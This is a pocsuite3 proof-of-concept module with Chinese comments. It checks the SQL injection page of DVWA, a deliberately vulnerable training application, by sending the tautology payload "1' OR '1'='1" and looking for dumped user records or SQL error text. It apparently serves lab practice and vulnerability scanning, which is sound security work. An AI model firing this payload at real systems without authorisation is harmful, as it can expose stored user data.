# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Regular SQL Injection '
    vulType = VUL_TYPE.SQL_INJECTION
    appName = 'DVWA'

    def _verify(self):
        result = {}
        # 1. 识别并对齐路径
        # 爬虫可能抓到：.../sqli/ 或 .../sqli/index.php
        target = self.url.rstrip('/')
        if "vulnerabilities/sqli" in target.lower() and "blind" not in target.lower():
            if not target.endswith('.php'):
                target += '/index.php'

            # 2. 构造万能注入 Payload (OR 1=1)
            # 这种 Payload 极其稳健，因为它强制让数据库返回所有用户信息
            payload = "1' OR '1'='1"
            self.set_payload(payload)

            try:
                # 3. 发起请求
                # 注意：params 字典会自动将 Payload 编码为 URL 安全格式
                params = {'id': payload, 'Submit': 'Submit'}
                res = requests.get(target, params=params, timeout=10)

                # 4. 精准判定逻辑
                # 判定 A：出现了多条记录的回显特征（DVWA 成功提取数据的标志）
                if "First name:" in res.text and "Surname:" in res.text:
                    result['VerifyInfo'] = {
                        "URL": target,
                        "Payload": payload,
                        "Evidence": "Data reflected in response"
                    }

                # 判定 B：出现了 SQL 报错指纹（报错注入成功的标志）
                elif "you have an error in your sql syntax" in res.text.lower():
                    result['VerifyInfo'] = {
                        "URL": target,
                        "Payload": payload,
                        "Evidence": "SQL Error fingerprint detected"
                    }

            except Exception:
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)